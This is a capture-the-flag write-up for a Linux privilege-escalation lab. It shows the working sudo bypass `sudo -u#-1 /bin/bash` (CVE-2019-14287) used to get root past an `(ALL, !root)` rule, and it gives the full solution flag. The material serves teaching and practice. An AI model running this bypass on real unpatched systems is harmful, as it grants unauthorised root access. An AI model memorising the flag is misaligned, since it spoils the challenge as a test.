# The Farewell Gift v2 - Writeup

## Challenge Info
- **Name**: The Farewell Gift v2
- **Category**: Privilege Escalation
- **Difficulty**: Medium-Hard
- **Flag**: `EXPLOIT3RS{sud0_m1nus_0n3_g0t_m3_r00t}`

---

## Solution Walkthrough

### Step 1: Initial Enumeration

```bash
whoami
# kevin-debug

id
# uid=1000(kevin-debug) gid=1000(kevin-debug) groups=1000(kevin-debug)

sudo -l
# User kevin-debug may run the following commands:
#     (ALL, !root) NOPASSWD: /bin/bash
```

**Key observation**: We can run `/bin/bash` as ANY user EXCEPT root.

### Step 2: Explore for Clues

Most files are decoys. The real clues are subtle:

```bash
# Check debug log
cat /opt/nimbus/logs/debug.log
# [DEBUG] Interesting behavior with negative values
# [WARN]  Unexpected UID resolution

# Check Kevin's secret note
cat /var/backups/kevin_stuff/.secret_note.txt
# "What if you don't use the name?"
# "What if you use the number?"
# "What if the number is... unusual?"
# "Especially with negative numbers."
# "Especially with how they wrap around."

# Check Kevin's thoughts
cat /tmp/.k3v1n/thoughts.txt
# "When you subtract 1 from 0 in unsigned math..."
# "You get the biggest number possible"
# "What if -1 becomes 0?"

# Check the sudo meme
cat /var/backups/kevin_stuff/memes/sudo_meme.txt
# "What if user ID goes brrr?"
# "Sometimes the answer is negative."
```

### Step 3: Research

The clues point to:
- Sudo bypass
- Negative user IDs
- UID resolution issues
- -1 becoming 0

Research "sudo -1 bypass" or "sudo negative user id" leads to **CVE-2019-14287**.

### Step 4: Exploit

The sudo configuration `(ALL, !root)` can be bypassed using user ID -1:

```bash
sudo -u#-1 /bin/bash
```

**Why it works**:
- `-u#-1` tells sudo to run as user ID -1
- Due to integer overflow, -1 becomes 4294967295 (max unsigned int)
- Sudo then converts this back and it becomes 0 (root's UID)
- The `!root` check looks for the string "root", not UID 0

```bash
whoami
# root
```

### Step 5: Find the Flag Parts

```bash
cd /root/kevin_farewell

# Read goodbye message
cat goodbye.txt
# Mentions: ROT13, three parts, some files are decoys

# Don't fall for decoys!
cat flag.txt        # FAKE: "just_kidding_lol"
cat real_flag.txt   # FAKE: "Think harder"

# Find hidden directory
ls -la
ls -la .flag/

# Part 1
cat .flag/part1.dat
# RKCYBVG3EF{fhq0

# Part 2 (hidden file)
cat .flag/.final
# _z1ahf_0a3_t

# Part 3 (embedded in image)
strings kevin_selfie.png | grep -E '^[0-9a-zA-Z_{}]+$'
# 0g_z3_e00g}
```

### Step 6: Decode ROT13

Combine parts: `RKCYBVG3EF{fhq0_z1ahf_0a3_t0g_z3_e00g}`

```bash
echo "RKCYBVG3EF{fhq0_z1ahf_0a3_t0g_z3_e00g}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# EXPLOIT3RS{sud0_m1nus_0n3_g0t_m3_r00t}
```

Or in Python:
```python
import codecs
codecs.decode("RKCYBVG3EF{fhq0_z1ahf_0a3_t0g_z3_e00g}", "rot_13")
```

---

## Flag

```
EXPLOIT3RS{sud0_m1nus_0n3_g0t_m3_r00t}
```

---

## Skills Demonstrated

1. **Linux enumeration** - Checking sudo permissions, exploring filesystem
2. **Critical thinking** - Distinguishing real clues from decoys
3. **Research skills** - Finding CVE-2019-14287 from subtle hints
4. **Privilege escalation** - Exploiting sudo misconfiguration
5. **Forensics** - Using `strings` to find hidden data in binary files
6. **Cryptography** - Recognizing and decoding ROT13

---

## Common Mistakes

1. **Reading every decoy file** - There are 30+ decoys to waste your time
2. **Trying `flag.txt`** - Too obvious, it's a troll
3. **Missing hidden files** - Always use `ls -la`
4. **Not using `strings`** - The PNG contains ASCII text
5. **Forgetting ROT13** - The goodbye message tells you the cipher

---

## References

- [CVE-2019-14287](https://nvd.nist.gov/vuln/detail/CVE-2019-14287)
- [Sudo Security Bypass](https://www.sudo.ws/alerts/minus_1_uid.html)
